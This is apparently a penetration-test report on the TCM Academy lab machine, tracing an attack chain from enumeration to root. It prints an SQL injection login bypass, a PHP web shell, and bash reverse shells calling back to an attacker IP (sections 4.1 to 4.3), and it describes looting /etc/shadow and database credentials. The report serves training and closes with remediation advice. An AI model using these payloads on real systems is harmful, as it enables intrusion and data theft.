# TCM Academy Machine - Penetration Test Report

Author: Daniel Struble  
Date: 01-11-2026  
Target Summary: Through service fingerprinting and enumeration, the server was determined to be a Debian Linux host running Apache, PHP, and MariaDB hosting a custom application (“Academy”).

## 1. Executive Summary

This was a black-box test against a single Linux target. Only the IP was known in advance.

Attack chain summary:

1. Enumerated open services.
2. Discovered /academy application and phpMyAdmin directory.
3. Bypassed login via SQL injection.
4. Uploaded a PHP web shell through an insecure avatar upload function.
5. Gained remote code execution as www-data.
6. Found a root-executed cron job pointing to /home/grimmie/backup.sh.
7. Overwrote that script because the directory was writable.
8. Inserted a reverse shell payload.
9. Waited for cron to execute it as root, obtaining full system compromise.

Plain-language version:  
I scanned the machine, found a weak website, tricked the login with SQL injection, uploaded code disguised as an image, and rewrote a system script the computer ran automatically as root. That script called back to me and gave me full control.

## 2. Scope and Objectives

Technical objectives:
- Identify exposed services.
- Test them for vulnerabilities.
- Achieve remote code execution if possible.
- Escalate privileges to root.
- Extract sensitive data as proof of compromise.

Plain version:  
The goal was: find a way in, climb to root, and show the risks with evidence.

## 3. Reconnaissance and Enumeration

### 3.1 Network Scan (Initial Discovery)

Command used:  
nmap -sS -sV -O -p- 192.168.245.143

Scan results:

- Port 21/tcp open ftp vsftpd 3.0.3  
- Port 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2  
- Port 80/tcp open http Apache 2.4.38 (Debian)

OS fingerprinting:
- Linux kernel in the 4.x–5.x family
- VMware virtual machine detected

Interpretation:  
SSH and FTP showed nothing useful immediately. HTTP was the best target.

### 3.2 Web Enumeration

Initial browsing displayed Apache’s default Debian welcome page.

### 3.2.1 Gobuster Scan #1

Wordlist used: dirb/common.txt

Findings:
- /.htpasswd (403)
- /.htaccess (403)
- /.hta (403)
- /index.html (200)
- /phpmyadmin (301 redirect)
- /server-status (403)

Interpretation:  
phpMyAdmin exposure was the only interesting result.

### 3.2.2 phpMyAdmin interface

Accessing /phpmyadmin showed a login page requiring credentials. Default logins failed.

### 3.2.3 Gobuster Scan #2 (Medium wordlist)

Found:
- /academy (301 redirect)

### 3.2.4 /academy application

Accessing /academy/index.php revealed an online course registration system with a Reg No + Password login.

### 3.2.5 SQL Injection Authentication Bypass

Payload used:  
' OR '1'='1

This bypassed authentication entirely.

Interpretation:  
The SQL query was unsafely concatenating user input.

### 3.2.6 Insecure File Upload

On the profile edit page, the avatar upload form allowed arbitrary file types. PHP files were accepted and stored in /academy/studentphoto/ without validation.

This allowed uploading a PHP web shell.

## 4. Exploitation

### 4.1 Web Shell Upload

A minimal PHP system-execution shell was uploaded (<?php system($_GET['cmd']); ?>). Visiting it with a cmd parameter returned command execution as user www-data.

### 4.2 Reverse Shell

A bash TCP reverse shell was executed via:  
bash -c 'bash -i >& /dev/tcp/192.168.245.131/4444 0>&1'

The attacker's listener received an interactive www-data shell.

## 4.3 Privilege Escalation: www-data -> root

Inspection of /etc/crontab revealed:

\* \* \* \* \* root /home/grimmie/backup.sh

This means:
- The script ran every minute
- It ran as root
- It lived in a user home directory
- The directory was writable by www-data

Directory permissions confirmed:

drwxrwxrwx 3 grimmie administrator 4096 Dec 14 17:28 /home/grimmie

Because www-data had write access, the contents of backup.sh were replaced with a reverse shell payload:

#!/bin/bash  
bash -i >& /dev/tcp/192.168.245.131/8080 0>&1

Within 60 seconds, cron executed the modified script as root, opening a root shell on the attacker machine.

Result:  
root@academy:~# id  
uid=0(root) gid=0(root)

## 5. Post-Exploitation

### 5.1 Database Credential Recovery

From the application config file:
- DB user: grimmie
- DB password: [REDACTED]
- Database name: onlinecourse

These credentials allowed access to the MariaDB instance. Inside the database, plaintext or weakly hashed student and admin credentials were found.

### 5.2 File and System Loot

Extracted:
- /etc/passwd
- /etc/shadow
- Web root (/var/www/html)
- Database dumps
- Configuration files

### 5.3 Flag Extraction

The root flag was found at /root/flag.txt.

## 6. Findings Summary

Critical findings:
- SQL injection in login form
- Arbitrary file upload leading to RCE
- World-writable user home directory
- Root cron job executing user-writable script
- Exposed phpMyAdmin

Impact:  
Full system compromise from unauthenticated user to root.

## 7. Remediation Recommendations

- Fix SQL injection using prepared statements
- Perform strict server-side file validation
- Remove world-writable directory permissions
- Restrict cron jobs to root-owned, root-writable paths only
- Restrict phpMyAdmin to authorized IPs
- Enforce strong credential storage and password hashing
- Regularly audit file permissions
